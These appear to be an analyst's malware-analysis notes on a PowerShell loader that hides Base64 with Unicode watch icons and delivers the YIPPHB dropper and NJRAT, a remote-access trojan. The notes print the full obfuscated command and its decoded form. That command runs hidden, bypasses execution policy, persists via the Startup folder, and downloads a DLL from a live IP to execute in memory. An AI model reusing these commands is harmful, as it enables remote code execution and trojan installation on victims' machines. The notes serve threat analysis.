## Key takeaways

- Elastic Security Labs identified 12 clusters of activity using a similar TTP of threading Base64 encoded strings with Unicode icons to load the YIPPHB dropper.
- YIPPHB is an unsophisticated, but effective, dropper used to deliver RAT implants going back at least May of 2022.
- The initial access attempts to use Unicode icons embedded in Powershell to delay automated analysis.

## **Preamble**

While reviewing telemetry data, Elastic Security Labs identified abnormal arguments during the execution of Powershell. A closer examination identified the use of Unicode icons within Base64-encoded strings.  A substitution mechanism was used to replace the icons with ASCII characters.

Once the icons were replaced with ASCII characters, a repetitive process of collecting Base64 encoded files and reversed URLs was used to execute a dropper and a full-featured malware implant. The dropper and malware implant was later identified as YIPPHB and NJRAT, respectively.

This research focused on the following:

- Loader phase
- Dropper phase

## **Analysis**

The analysis of the intrusion set describes an obsfuscation method (maybe) intended to evade automated analysis of PowerShell commands

![[Untitled 540.png|Untitled 540.png]]

Execution flow for the REF4526 intrusion set

![[Untitled 1 6.png|Untitled 1 6.png]]

Trend Micro Vision One Alert

![[Untitled 2 6.png|Untitled 2 6.png]]

![[Untitled 3 6.png|Untitled 3 6.png]]

**maintains access by copying itself into the user's Startup folder as a natively-supported VBscript.**

## **Loader phase**

While analyzing the Powershell command, I observed Unicode icons embedded into Powershell commands. The use of Unicode to obfuscate Powershell commands is not a technique i have observed.

```PowerShell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command $iUqm = 'JABSAG8AZABhAEMAbwBwAHkAIAA9ACAAJwC0ALIAqgC3ALMAtwCzAKoAswC0ACcAOwBbAEIAeQB0AG⌚⌚⌚AWwBdAF0AIAAkAEQATABMACAAPQAgAFsAcwB5AHMAdABlAG0ALgBDAG8AbgB2AG⌚⌚⌚AcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQA⌚⌚⌚wB0AHIAaQBuAGcAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAG⌚⌚⌚AdAAuAFcAZQBiAEMAbABpAG⌚⌚⌚AbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQA⌚⌚⌚wB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgAxADMALgA1ADAALgA3ADQALwBHAFIARQBFAE4ALwBSAFgAVwBFAFIALwBkAGwAbABmADMALgB0AHgAdAAnACkAKQA7AFsAcwB5AHMAdABlAG0ALgBBAHAAcABEAG8AbQBhAGkAbgBdADoAOgBDAH⌚⌚⌚AcgByAG⌚⌚⌚AbgB0AEQAbwBtAGEAaQBuAC4ATABvAGEAZAAoACQARABMAEwAKQAuAEcAZQB0AFQAeQBwAG⌚⌚⌚AKAAnAE4AdwBnAG8AeABNAC4ASwBQAEoAYQBOAGoAJwApAC4ARwBlAHQATQBlAHQAaABvAGQAKAAnAFAAVQBsAEcASwBBACcAKQAuAEkAbgB2AG8AawBlACgAJABuAH⌚⌚⌚AbABsACwAIABbAG8AYgBqAG⌚⌚⌚AYwB0AFsAXQBdACAAKAAnAEcAcwBBAG8AeQA5AFAAcwB3AHgAeAB4AC8AZABhAG8AbABuAHcAbwBkAC8AbQBvAGMALgBvAGkAZQB0AHMAYQBwAC8ALwA6AHMAcAB0AHQAaAAnACAALAAgACQA⌚⌚⌚gBvAGQAYQBDAG8AcAB5ACAALAAgACcARgAzACAAJwAgACkAKQA=';$OWjuxD = [system.Text.Encoding]::Unicode.GetString( [system.Convert]::FromBase64String( $iUqm.replace('⌚⌚⌚','U') ) );$OWjuxD = $OWjuxD.replace('´²ª·³·³ª³´', 'C:\Users\tcuame\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Multa\#6587765.pdf - copia - copia - copia (6).vbs');powershell.exe -windowstyle hidden -ExecutionPolicy Bypss -NoProfile -Command $OWjuxD
```

While this technique is not overly complex in that it simply replaces the icons with an ASCII character, it is creative. **This technique could delay automated analysis of Base64 encoded strings** unless the Powershell command was either fully executed or an analysis workflow was leveraged to process Unicode and replacement functions.

  

Looking at the Powershell command, i was able to identify a process to replace the Unicode watch icons (⌚⌚⌚) with a **U**.

To illustrate what’s happening, I used the data analysis tool created by the GCHQ: [**CyberChef**](https://gchq.github.io/CyberChef/).

  

![[Untitled 4 6.png|Untitled 4 6.png]]

The output was:

```PowerShell
$RodaCopy = '´²ª·³·³ª³´';[Byte[]] $DLL = [system.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://91[.]213[.]50[.]74/GREEN/RXWER/dllf3.txt'));[system.AppDomain][:][:]CurrentDomain.Load($DLL).GetType('NwgoxM.KPJaNj').GetMethod('PUlGKA').Invoke($null, [object[]] ('GsAoy9Pswxxx/daolnwod/moc.oietsap//:sptth' , $RodaCopy , 'F3 ' ))
```

There is an IP Address from where the **LOADER** is downloaded. `'hxxp[://]91[.]213[.]50[.]74/GREEN/RXWER/dllf3.txt'`

![[Untitled 5 5.png|Untitled 5 5.png]]

![[Untitled 6 4.png|Untitled 6 4.png]]

And also a reversed URL. `'hxxps[://]pasteio[.]com/download/xxxwsP9yoAsG'`

![[Untitled 7 4.png|Untitled 7 4.png]]

![[Untitled 8 4.png|Untitled 8 4.png]]

  

- Continued
    
    Downloading the **dllf3.txt** from the source provides me another Base64-encoded string.
    
    ![[Untitled 9 4.png|Untitled 9 4.png]]
    
      
    
    ## **Dropper phase**
    
    - What is a Dropper?
        
        A dropper is **a kind of Trojan that has been designed to "install" malware (virus, backdoor, etc.) to a computer**. The malware code can be contained within the dropper in such a way as to avoid detection by virus scanners; or the dropper may download the malware to the targeted computer once activated.